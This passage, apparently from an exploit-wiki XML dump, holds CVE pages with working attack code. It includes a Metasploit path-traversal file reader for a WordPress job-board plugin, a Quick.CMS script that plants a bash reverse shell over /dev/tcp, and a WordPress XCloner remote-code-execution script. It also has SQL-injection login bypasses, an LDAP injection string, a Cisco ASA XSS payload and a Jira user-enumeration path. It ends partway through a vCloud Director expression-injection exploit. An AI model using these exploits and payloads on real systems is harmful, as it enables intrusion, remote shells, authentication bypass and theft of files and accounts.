                OptString.new('FILEPATH',[true,'The path to the file to read','/etc/passwd']),
                OptString.new('USERNAME',[true,'The WordPress username to authenticate with']),
                OptString.new('PASSWORD',[true,'The Wordpress password to authenticate with']),
                OptInt.new('DEPTH',[true,'Traversal Depth (to reach the root folder',8]),
            ])
            end

            def username
                datastore['USERNAME']
            end

            def password
                datastore['PASSWORD']
            end

            def check
                cookie = wordpress_login(username,password)
                if cookie.nil?
                    store_valid_credential(user: username, private: password, proof: cookie)
                    return CheckCode::Safe
                end
                CheckCode::Appears
            end

            def run_host(ip)
                cookie = wordpress_login(username, password)
                traversal = '../' * datastore['DEPTH']
                filename = datastore['FILEPATH']
                filename = filename[1, filename.length] if filename =~ /^\//

                res = send_request_cgi({
                    'cookie' =&gt; cookie,
                    'method' =&gt; 'GET',
                    'uri' =&gt; normalize_uri(target_uri.path,'wp-admin',''),
                    'vars_get' =&gt;
                    {
                        'post' =&gt; 'application_id',
                        'action' =&gt; 'edit',
                        'sjb_file' =&gt; "#{traversal}#{filename}"
                    }
                })

                fail_with Failure::Unreachable, 'Connection failed' unless res fail_with Failure::NotVulnerable, 'Connection failed. Nothingn was downloaded' if res.code != 200
                fail_with Failure::NotVulnerable, 'Nothing was downloaded. Change the DEPTH parameter' if res.body.length.zero?
                print_good('Downloading file ...')
                print_line("\n#{res.body}\n")
                fname = datastore['FILEPATH']
                path = store_loot(
                    'Simple_JobBoard.traversal',
                    'text/plain',
                    ip,
                    res.body,
                    fname
                )
                print_good("File save in: #{path}")
            end
        end
            
&lt;/pre&gt;</text>
      <sha1>gdy6dznpcv1i1gtk9h0d8d8hgiuqmsi</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-35754 Quick.CMS 6.7 遠程命令執行漏洞</title>
    <ns>0</ns>
    <id>3225</id>
    <revision>
      <id>3763</id>
      <timestamp>2021-05-31T03:58:07Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Quick.CMS 6.7 - Remote Code Execution (Authenticated) # Date: 2020-12-28 # Exploit Author: mari0x00 # Vendor Homepage: https://opensolution.org/..."</comment>
      <origin>3763</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2229" sha1="4pbbuepszlkj8jttgp1zyzk0wgdkl7c" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Quick.CMS 6.7 - Remote Code Execution (Authenticated)
# Date: 2020-12-28
# Exploit Author: mari0x00
# Vendor Homepage: https://opensolution.org/
# Software Link: https://opensolution.org/download/?sFile=Quick.Cms_v6.7-pl.zip
# Description: https://secator.pl/index.php/2021/01/28/cve-2020-35754-authenticated-rce-in-quick-cms-and-quick-cart/
# Version: &lt;= 6.7
# CVE : CVE-2020-35754

#!/usr/bin/python3

import requests
import sys
from termcolor import colored
from time import sleep

print(colored('''###########################################################''',"red"))
print(colored('''######    Quick.CMS authenticated RCE by mari0x00   #######''',"red"))
print(colored('''###########################################################''',"red"))
print("")

if len(sys.argv) != 6:
    print((colored("[~] Usage : python3 quickpwn.py &lt;url&gt; &lt;username&gt; &lt;password&gt; &lt;IP&gt; &lt;PORT&gt;","red")))
    print((colored("[~] Example: python3 quickpwn.py http://192.168.101.105/quick.cms/ john@example.com pass123 192.168.101.101 4444","red")))
    exit()
url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]
IP = sys.argv[4]
PORT = sys.argv[5]


#Start session
s = requests.Session()
headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0'}


#Authenticate
print((colored("[+] Attempting user login","blue")))

login_data = {
    "sEmail": username,
    "sPass": password,
    "bAcceptLicense": "1",
    "iAcceptLicense": "true"
   }

login = s.post(url+"admin.php?p=login", login_data, headers=headers)
sleep(0.5)


#Exploit
print((colored("[+] Adding shell command","blue")))
payload = "Back end\\\"; system('/bin/bash -c \\'bash -i &gt;&amp; /dev/tcp/" + IP + "/" + PORT + " 0&gt;&amp;1\\''); //"

shell = {
    "sOption": "save",
    "Back_end_only": payload
}

exploit = s.post(url+"admin.php?p=languages&amp;sLangEdit=en", shell, headers=headers)
sleep(1)

#Triggering reverse shell (three times just in case)
print("")
print((colored("[+] Triggering the shell. Go nuts!","green")))
r = s.get(url+"admin.php?p=languages", headers=headers)
sleep(1)
r = s.get(url+"admin.php?p=languages", headers=headers)
sleep(1)
r = s.get(url+"admin.php?p=languages", headers=headers)
&lt;/pre&gt;</text>
      <sha1>4pbbuepszlkj8jttgp1zyzk0wgdkl7c</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-35775 CITSmart ITSM 9.1.2.22 - LDAP注入漏洞</title>
    <ns>0</ns>
    <id>1324</id>
    <revision>
      <id>1664</id>
      <timestamp>2021-04-14T09:01:33Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: CITSmart ITSM 9.1.2.22 - LDAP Injection # Google Dork: "citsmart.local" # Date: 29/12/2020 # Exploit Author: skysbsb # Vendor Homepage: https://..."</comment>
      <origin>1664</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1482" sha1="5cnsrll7371h7zzy2dhqgdjzzcsn657" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: CITSmart ITSM 9.1.2.22 - LDAP Injection
# Google Dork: "citsmart.local"
# Date: 29/12/2020
# Exploit Author: skysbsb
# Vendor Homepage: https://docs.citsmart.com/pt-br/citsmart-platform-9/get-started/about-citsmart/release-notes.html
# Version: &lt; 9.1.2.23
# CVE : CVE-2020-35775

To exploit this flaw it is necessary to have at least one user/password previously registered, because the system checks (ldap bind) the first user returned in the ldap search. However, it returns the last user found in the search to the function that called it (logic error).

So, I call this problem an LDAP injection in conjunction with a programming logic error that allows you to authenticate to CITSmart ITSM with another valid user without needing to know the target user's password.

Affected versions: &lt; 9.1.2.23
Fixed versions: &gt;= 9.1.2.23

Using this LDAP query in the username field of login page you could login with the target_username account without knowing the target account password.

*)(|(sAMAccountName=valid_username)(sAMAccountName=target_username)

You must know at least one username/password because the autenticacaoAD() function at LDAPUtils.java class (package br.com.centralit.citcorpore.integracao.ad) will try to bind with the first user (valid_username) of the query result.

Vendor has acknowledge this vulnerability at ticket 5929 (https://docs.citsmart.com/pt-br/citsmart-platform-9/get-started/about-citsmart/release-notes.html)
&lt;/pre&gt;</text>
      <sha1>5cnsrll7371h7zzy2dhqgdjzzcsn657</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-35775 Digital Crime Report Management System 1.0 SQL注入漏洞</title>
    <ns>0</ns>
    <id>1325</id>
    <revision>
      <id>1665</id>
      <timestamp>2021-04-14T09:02:28Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; # Exploit Title: Digital Crime Report Management System 1.0 - SQL Injection (Authentication Bypass) # Date: 13 April 2021 # Exploit Author: Galuh Muhammad Iman A..."</comment>
      <origin>1665</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="3023" sha1="5c7ak07cnx41gk5cugfne067df7sjx7" xml:space="preserve">==EXP==
&lt;pre&gt;
# Exploit Title: Digital Crime Report Management System 1.0 - SQL Injection (Authentication Bypass)
# Date: 13 April 2021
# Exploit Author: Galuh Muhammad Iman Akbar (GaluhID)
# Vendor Homepage: https://iwantsourcecodes.com/digital-crime-report-management-system-in-php-with-source-code/
# Software Link: https://iwantfilemanager.com/?dl=b48d951cbdd50568b031aab3b619fed2

I Found SQL Injection in 4 Page Login (Police Login page, Incharge Login page, User Login &amp; HQ Login)
*Police Login page*

POST /digital-cyber-crime-report/policelogin.php HTTP/1.1
Host: 192.168.1.14
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0)
Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: http://192.168.1.14
Connection: close
Referer: http://192.168.1.14/digital-cyber-crime-report/policelogin.php
Cookie: PHPSESSID=5sll425q7s76lpl9m1copg6mpe
Upgrade-Insecure-Requests: 1

email='or''='&amp;password='or''='&amp;s=

*Incharge Login*
POST /digital-cyber-crime-report/inchargelogin.php HTTP/1.1
Host: 192.168.1.14
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0)
Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Origin: http://192.168.1.14
Connection: close
Referer: http://192.168.1.14/digital-cyber-crime-report/inchargelogin.php
Cookie: PHPSESSID=5sll425q7s76lpl9m1copg6mpe
Upgrade-Insecure-Requests: 1

email='or''='&amp;password='or''='&amp;s=

*User Login*
POST /digital-cyber-crime-report/userlogin.php HTTP/1.1
Host: 192.168.1.14
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0)
Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Origin: http://192.168.1.14
Connection: close
Referer: http://192.168.1.14/digital-cyber-crime-report/userlogin.php
Cookie: PHPSESSID=5sll425q7s76lpl9m1copg6mpe
Upgrade-Insecure-Requests: 1

email=imanakbar1000%40gmail.com&amp;password='or''='&amp;s=

*HQ Login*
POST /digital-cyber-crime-report/headlogin.php HTTP/1.1
Host: 192.168.1.14
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0)
Gecko/20100101 Firefox/87.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Origin: http://192.168.1.14
Connection: close
Referer: http://192.168.1.14/digital-cyber-crime-report/headlogin.php
Cookie: PHPSESSID=5sll425q7s76lpl9m1copg6mpe
Upgrade-Insecure-Requests: 1

email=imanakbar1000%40gmail.com&amp;password='or''='&amp;s=
&lt;/pre&gt;</text>
      <sha1>5c7ak07cnx41gk5cugfne067df7sjx7</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-3580 Cisco ASA XSS漏洞</title>
    <ns>0</ns>
    <id>5254</id>
    <revision>
      <id>6015</id>
      <timestamp>2021-06-29T01:16:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==XSS== &lt;pre&gt; POST /+CSCOE+/saml/sp/acs?tgname=a HTTP/1.1 Host: ciscoASA.local Content-Type: application/x-www-form-urlencoded Content-Length: 44  SAMLResponse="&gt;&lt;svg/onload=a..."</comment>
      <origin>6015</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="198" sha1="oqow53fbp5a9gytnyznsskimld9hs9c" xml:space="preserve">==XSS==
&lt;pre&gt;
POST /+CSCOE+/saml/sp/acs?tgname=a HTTP/1.1
Host: ciscoASA.local
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

SAMLResponse="&gt;&lt;svg/onload=alert('PTSwarm')&gt;
&lt;/pre&gt;</text>
      <sha1>oqow53fbp5a9gytnyznsskimld9hs9c</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-35948 wordpress Plugin XCloner 4.2.12 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>5338</id>
    <revision>
      <id>6117</id>
      <timestamp>2021-07-02T03:14:51Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==漏洞影響== &lt;/translate&gt; Version: 4.2.1 - 4.2.12  ==EXP== &lt;pre&gt; # Exploit Title: Wordpress Plugin XCloner 4.2.12 - Remote Code Execution (Authen..."</comment>
      <origin>6117</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4424" sha1="s2slyerf8higkh0n3s4qbjbn8w5zmyy" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;
Version: 4.2.1 - 4.2.12

==EXP==
&lt;pre&gt;
# Exploit Title: Wordpress Plugin XCloner 4.2.12 - Remote Code Execution (Authenticated)
# Date 30.06.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://www.xcloner.com/
# Software Link: https://downloads.wordpress.org/plugin/xcloner-backup-and-restore.4.2.12.zip
# Version: 4.2.1 - 4.2.12
# Tested on: Ubuntu 18.04
# CVE: CVE-2020-35948
# CWE: CWE-732
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/CVE-2020-35948-Exploit/README.md

'''
Description:
An issue was discovered in the XCloner Backup and Restore plugin before 4.2.13 for WordPress. It gave authenticated attackers the ability to modify arbitrary files, 
including PHP files. Doing so would allow an attacker to achieve remote code execution. The xcloner_restore.php write_file_action could overwrite wp-config.php, 
for example. Alternatively, an attacker could create an exploit chain to obtain a database dump.
'''


'''
Banner:
'''
banner = """


  #####  #     # #######        #####    ###    #####    ###          #####  #######  #####  #        #####  
 #     # #     # #             #     #  #   #  #     #  #   #        #     # #       #     # #    #  #     # 
 #       #     # #                   # #     #       # #     #             # #       #     # #    #  #     # 
 #       #     # #####   #####  #####  #     #  #####  #     # #####  #####  ######   ###### #    #   #####  
 #        #   #  #             #       #     # #       #     #             #       #       # ####### #     # 
 #     #   # #   #             #        #   #  #        #   #        #     # #     # #     #      #  #     # 
  #####     #    #######       #######   ###   #######   ###          #####   #####   #####       #   #####  
                                                                                                             
                                                                                                             
                                                                
                                                                by @Hacker5preme
"""
print(banner)


'''
Import required modules:
'''
import requests
import argparse


'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='Wordpress Plugin XCloner RCE (Authenticated)')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH
username = args.USERNAME
password = args.PASSWORD
print('')
ajax_cmd = input('[*] Ajax Command to execute: ')

'''
Authentication:
'''
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'

# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Body:
body = {
    'log':  username, 
    'pwd': password, 
    'wp-submit': 'Log In', 
    'testcookie': '1'
}

# Authenticate:
print('')
auth = session.post(auth_url, headers=header, data=body)
auth_header= auth.headers['Set-Cookie']
if 'wordpress_logged_in' in auth_header:
    print('[+] Authentication successfull !')
else:
    print('[-] Authentication failed !')
    exit()


'''
Exploit:
'''
url_exploit = "http://192.168.0.38:80/wordpress//wp-admin/admin-ajax.php?action=restore_backup"

header = {
    "Accept": "*/*",
    "Content-Type": "multipart/form-data; boundary=------------------------08425016980d7357",
    "Connection": "close"
}

# Body:
body = "--------------------------08425016980d7357\r\nContent-Disposition: form-data; name=\"xcloner_action\"\r\n\r\n%s\r\n--------------------------08425016980d7357--\r\n" % (ajax_cmd)

exploit = session.post(url_exploit, headers=header, data=body)
print('')
print(exploit.text)
print('')
&lt;/pre&gt;</text>
      <sha1>s2slyerf8higkh0n3s4qbjbn8w5zmyy</sha1>
    </revision>
    <revision>
      <id>6120</id>
      <parentid>6117</parentid>
      <timestamp>2021-07-02T03:15:20Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>6120</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4435" sha1="lr2pjnrm1opuhmue50aogbwpzk6gn9v" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==漏洞影響== &lt;!--T:1--&gt;
&lt;/translate&gt;
Version: 4.2.1 - 4.2.12

==EXP==
&lt;pre&gt;
# Exploit Title: Wordpress Plugin XCloner 4.2.12 - Remote Code Execution (Authenticated)
# Date 30.06.2021
# Exploit Author: Ron Jost (Hacker5preme)
# Vendor Homepage: https://www.xcloner.com/
# Software Link: https://downloads.wordpress.org/plugin/xcloner-backup-and-restore.4.2.12.zip
# Version: 4.2.1 - 4.2.12
# Tested on: Ubuntu 18.04
# CVE: CVE-2020-35948
# CWE: CWE-732
# Documentation: https://github.com/Hacker5preme/Exploits/blob/main/CVE-2020-35948-Exploit/README.md

'''
Description:
An issue was discovered in the XCloner Backup and Restore plugin before 4.2.13 for WordPress. It gave authenticated attackers the ability to modify arbitrary files, 
including PHP files. Doing so would allow an attacker to achieve remote code execution. The xcloner_restore.php write_file_action could overwrite wp-config.php, 
for example. Alternatively, an attacker could create an exploit chain to obtain a database dump.
'''


'''
Banner:
'''
banner = """


  #####  #     # #######        #####    ###    #####    ###          #####  #######  #####  #        #####  
 #     # #     # #             #     #  #   #  #     #  #   #        #     # #       #     # #    #  #     # 
 #       #     # #                   # #     #       # #     #             # #       #     # #    #  #     # 
 #       #     # #####   #####  #####  #     #  #####  #     # #####  #####  ######   ###### #    #   #####  
 #        #   #  #             #       #     # #       #     #             #       #       # ####### #     # 
 #     #   # #   #             #        #   #  #        #   #        #     # #     # #     #      #  #     # 
  #####     #    #######       #######   ###   #######   ###          #####   #####   #####       #   #####  
                                                                                                             
                                                                                                             
                                                                
                                                                by @Hacker5preme
"""
print(banner)


'''
Import required modules:
'''
import requests
import argparse


'''
User-Input:
'''
my_parser = argparse.ArgumentParser(description='Wordpress Plugin XCloner RCE (Authenticated)')
my_parser.add_argument('-T', '--IP', type=str)
my_parser.add_argument('-P', '--PORT', type=str)
my_parser.add_argument('-U', '--PATH', type=str)
my_parser.add_argument('-u', '--USERNAME', type=str)
my_parser.add_argument('-p', '--PASSWORD', type=str)
args = my_parser.parse_args()
target_ip = args.IP
target_port = args.PORT
wp_path = args.PATH
username = args.USERNAME
password = args.PASSWORD
print('')
ajax_cmd = input('[*] Ajax Command to execute: ')

'''
Authentication:
'''
session = requests.Session()
auth_url = 'http://' + target_ip + ':' + target_port + wp_path + 'wp-login.php'

# Header:
header = {
    'Host': target_ip,
    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'de,en-US;q=0.7,en;q=0.3',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://' + target_ip,
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1'
}

# Body:
body = {
    'log':  username, 
    'pwd': password, 
    'wp-submit': 'Log In', 
    'testcookie': '1'
}

# Authenticate:
print('')
auth = session.post(auth_url, headers=header, data=body)
auth_header= auth.headers['Set-Cookie']
if 'wordpress_logged_in' in auth_header:
    print('[+] Authentication successfull !')
else:
    print('[-] Authentication failed !')
    exit()


'''
Exploit:
'''
url_exploit = "http://192.168.0.38:80/wordpress//wp-admin/admin-ajax.php?action=restore_backup"

header = {
    "Accept": "*/*",
    "Content-Type": "multipart/form-data; boundary=------------------------08425016980d7357",
    "Connection": "close"
}

# Body:
body = "--------------------------08425016980d7357\r\nContent-Disposition: form-data; name=\"xcloner_action\"\r\n\r\n%s\r\n--------------------------08425016980d7357--\r\n" % (ajax_cmd)

exploit = session.post(url_exploit, headers=header, data=body)
print('')
print(exploit.text)
print('')
&lt;/pre&gt;</text>
      <sha1>lr2pjnrm1opuhmue50aogbwpzk6gn9v</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-36289 Atlassian Jira Unauth 用戶枚舉漏洞</title>
    <ns>0</ns>
    <id>4134</id>
    <revision>
      <id>4762</id>
      <timestamp>2021-06-11T12:17:41Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages /&gt; &lt;translate&gt; ==影響版本== &lt;/translate&gt; &lt;pre&gt; Jira &lt; 8.5.13 8.6.0 ≤ Jira &lt; 8.13.5 8.14.0 ≤ Jira &lt; 8.15.1 &lt;/pre&gt;  ==POC== &lt;pre&gt; /secure/QueryComponentRender..."</comment>
      <origin>4762</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="302" sha1="l2d29yovidpgttaj5tajwmrkfmiab86" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本==
&lt;/translate&gt;
&lt;pre&gt;
Jira &lt; 8.5.13
8.6.0 ≤ Jira &lt; 8.13.5
8.14.0 ≤ Jira &lt; 8.15.1
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin
&lt;/pre&gt;

&lt;translate&gt;
==截圖==
&lt;/translate&gt;
[[File:Twitter_E3k2_J4VIAAWR_6.jpg|800px]]</text>
      <sha1>l2d29yovidpgttaj5tajwmrkfmiab86</sha1>
    </revision>
    <revision>
      <id>4763</id>
      <parentid>4762</parentid>
      <timestamp>2021-06-11T12:18:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>4763</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="324" sha1="f1uxzryb7do4lblpxguqt4gq5q64bbt" xml:space="preserve">&lt;languages /&gt;
&lt;translate&gt;
==影響版本== &lt;!--T:1--&gt;
&lt;/translate&gt;
&lt;pre&gt;
Jira &lt; 8.5.13
8.6.0 ≤ Jira &lt; 8.13.5
8.14.0 ≤ Jira &lt; 8.15.1
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin
&lt;/pre&gt;

&lt;translate&gt;
==截圖== &lt;!--T:2--&gt;
&lt;/translate&gt;
[[File:Twitter_E3k2_J4VIAAWR_6.jpg|800px]]</text>
      <sha1>f1uxzryb7do4lblpxguqt4gq5q64bbt</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-36289 Atlassian Jira Unauth 用戶枚舉漏洞/en</title>
    <ns>0</ns>
    <id>4145</id>
    <revision>
      <id>4774</id>
      <timestamp>2021-06-11T12:24:17Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Screenshot=="</comment>
      <origin>4774</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="261" sha1="2bcppdbzrpq767thabiyhs1kqkcntq5" xml:space="preserve">&lt;languages /&gt;
==Affected Versions==
&lt;pre&gt;
Jira &lt; 8.5.13
8.6.0 ≤ Jira &lt; 8.13.5
8.14.0 ≤ Jira &lt; 8.15.1
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin
&lt;/pre&gt;

==Screenshot==
[[File:Twitter_E3k2_J4VIAAWR_6.jpg|800px]]</text>
      <sha1>2bcppdbzrpq767thabiyhs1kqkcntq5</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-36289 Atlassian Jira Unauth 用戶枚舉漏洞/es</title>
    <ns>0</ns>
    <id>4153</id>
    <revision>
      <id>4782</id>
      <timestamp>2021-06-11T12:33:29Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2020-36289 Vulnerabilidad de enumeración de usuarios de Atlassian Jira Unauth"</comment>
      <origin>4782</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="274" sha1="jblygazewy217zwyp13tb887mqf08n3" xml:space="preserve">&lt;languages /&gt;
== Versión afectada ==
&lt;pre&gt;
Jira &lt; 8.5.13
8.6.0 ≤ Jira &lt; 8.13.5
8.14.0 ≤ Jira &lt; 8.15.1
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin
&lt;/pre&gt;

== Captura de pantalla ==
[[File:Twitter_E3k2_J4VIAAWR_6.jpg|800px]]</text>
      <sha1>jblygazewy217zwyp13tb887mqf08n3</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-36289 Atlassian Jira Unauth 用戶枚舉漏洞/he</title>
    <ns>0</ns>
    <id>4149</id>
    <revision>
      <id>4778</id>
      <timestamp>2021-06-11T12:32:08Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "== צילום מסך =="</comment>
      <origin>4778</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="274" sha1="om7hpobwisykv0vs15x82ez21kpdhns" xml:space="preserve">&lt;languages /&gt;
==גרסה מושפעת==
&lt;pre&gt;
Jira &lt; 8.5.13
8.6.0 ≤ Jira &lt; 8.13.5
8.14.0 ≤ Jira &lt; 8.15.1
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin
&lt;/pre&gt;

== צילום מסך ==
[[File:Twitter_E3k2_J4VIAAWR_6.jpg|800px]]</text>
      <sha1>om7hpobwisykv0vs15x82ez21kpdhns</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-36289 Atlassian Jira Unauth 用戶枚舉漏洞/zh-cn</title>
    <ns>0</ns>
    <id>4144</id>
    <revision>
      <id>4773</id>
      <timestamp>2021-06-11T12:23:06Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "CVE-2020-36289 Atlassian Jira Unauth 用户枚举漏洞"</comment>
      <origin>4773</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="252" sha1="2b4xdmu1zqyi8hhl9x7k92tjp5ga54r" xml:space="preserve">&lt;languages /&gt;
==影响版本==
&lt;pre&gt;
Jira &lt; 8.5.13
8.6.0 ≤ Jira &lt; 8.13.5
8.14.0 ≤ Jira &lt; 8.15.1
&lt;/pre&gt;

==POC==
&lt;pre&gt;
/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin
&lt;/pre&gt;

==截图==
[[File:Twitter_E3k2_J4VIAAWR_6.jpg|800px]]</text>
      <sha1>2b4xdmu1zqyi8hhl9x7k92tjp5ga54r</sha1>
    </revision>
  </page>
  <page>
    <title>CVE-2020-3956 vCloud Director 9.7.0.15498291 遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>1194</id>
    <revision>
      <id>1498</id>
      <timestamp>2021-04-11T01:12:16Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; #!/usr/bin/python # Exploit Title: vCloud Director - Remote Code Execution # Exploit Author: Tomas Melicher # Technical Details: https://citadelo.com/en/blog/ful..."</comment>
      <origin>1498</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="5883" sha1="fdiqmnrfq2nllq3dnnpetiw1c85nb55" xml:space="preserve">==EXP==
&lt;pre&gt;
#!/usr/bin/python
# Exploit Title: vCloud Director - Remote Code Execution
# Exploit Author: Tomas Melicher
# Technical Details: https://citadelo.com/en/blog/full-infrastructure-takeover-of-vmware-cloud-director-CVE-2020-3956/
# Date: 2020-05-24
# Vendor Homepage: https://www.vmware.com/
# Software Link: https://www.vmware.com/products/cloud-director.html
# Tested On: vCloud Director 9.7.0.15498291
# Vulnerability Description: 
#   VMware vCloud Director suffers from an Expression Injection Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) via submitting malicious value as a SMTP host name.

import argparse # pip install argparse
import base64, os, re, requests, sys
if sys.version_info &gt;= (3, 0):
    from urllib.parse import urlparse
else:
    from urlparse import urlparse

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

PAYLOAD_TEMPLATE = "${''.getClass().forName('java.io.BufferedReader').getDeclaredConstructors()[1].newInstance(''.getClass().forName('java.io.InputStreamReader').getDeclaredConstructors()[3].newInstance(''.getClass().forName('java.lang.ProcessBuilder').getDeclaredConstructors()[0].newInstance(['bash','-c','echo COMMAND|base64 -di|bash|base64 -w 0']).start().getInputStream())).readLine()}"
session = requests.Session()

def login(url, username, password, verbose):
	target_url = '%s://%s%s'%(url.scheme, url.netloc, url.path)
	res = session.get(target_url)
	match = re.search(r'tenant:([^"]+)', res.content, re.IGNORECASE)
	if match:
		tenant = match.group(1)
	else:
		print('[!] can\'t find tenant identifier')
		return (None,None,None,None)

	if verbose:
		print('[*] tenant: %s'%(tenant))

	match = re.search(r'security_check\?[^"]+', res.content, re.IGNORECASE)
	if match:																			# Cloud Director 9.*
